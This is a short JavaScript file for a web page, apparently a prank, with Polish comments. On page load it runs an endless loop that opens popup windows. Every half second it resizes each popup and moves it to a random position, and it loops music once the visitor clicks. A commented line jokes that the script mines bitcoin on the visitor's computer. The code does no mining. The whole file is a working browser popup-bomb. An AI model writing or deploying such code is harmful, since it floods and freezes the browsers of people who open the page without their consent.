const music = new Audio('muza.mp3');

const main = () => {
    //console.log('szkajpurPompa')
    //console.log('jak cos to kopie wlasnie bitcoina na twoim kompie iksde')
    while (true) {
        new NewWindow();
    }
}

addEventListener('DOMContentLoaded', () => {
    main();
})

addEventListener('click', () => {
    music.loop = true;
    music.play();
});

class NewWindow {
    constructor() {
        const win = window.open('', '_blank', "location=yes,height=150,width=150,scrollbars=yes,status=yes");
        if (!win) return;

        win.document.write('<html><body>dupsko</body></html>')
        // win.onload = function (ev) {


        // }
        setInterval(() => {
            let w = Math.random() * parseInt(window.screen.availWidth.toString());
            let h = Math.random() * parseInt(window.screen.availHeight.toString());
            win.resizeTo(w, h);
            win.moveTo(w, h)
        }, 500);

        // setTimeout(() => {
        //     clearInterval(timmy);
        //     win.close();
        // }, 6000);
    }
}

export { }